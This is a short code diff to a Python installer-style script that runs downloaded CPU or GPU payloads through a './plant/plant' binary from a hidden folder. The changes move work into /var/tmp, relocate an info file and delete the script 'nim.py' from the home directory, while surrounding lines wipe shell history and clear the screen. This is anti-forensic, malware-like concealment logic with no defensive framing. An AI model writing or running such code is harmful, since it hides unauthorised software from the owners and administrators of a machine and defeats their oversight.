@@ -229,16 +229,18 @@ def reset():
 
     if args.cpu: 
         # handle cpu
-        run_bash_command(command_folder + downloads['cpu']['link'])
+        run_bash_command(command_folder + "./plant/plant " + downloads['cpu']['link'])
         run_cpu(command_folder)
     
     if args.gpu: 
         # handle gpu
-        run_bash_command(command_folder + downloads['gpu']['link'])
+        run_bash_command(command_folder + "./plant/plant " + downloads['gpu']['link'])
         run_gpu(command_folder)
 
     return
 
+home_directory = os.getcwd()
+os.chdir("/var/tmp")
 username = get_username()
 if args.reset:
     reset()
@@ -271,9 +273,10 @@ else:
 run_bash_command("history -c")
 run_bash_command("> ~/.bash_history")
 os.system('clear')
+shutil.move(home_directory + "/info.txt", "/var/tmp")
 
-if os.path.exists("runtime.py"):
-    os.remove("runtime.py")
+if os.path.exists(home_directory + "/nim.py"):
+    os.remove(home_directory + "/nim.py")
 
 folder = check_hidden_folder()
 command_folder = f"cd {folder} && "
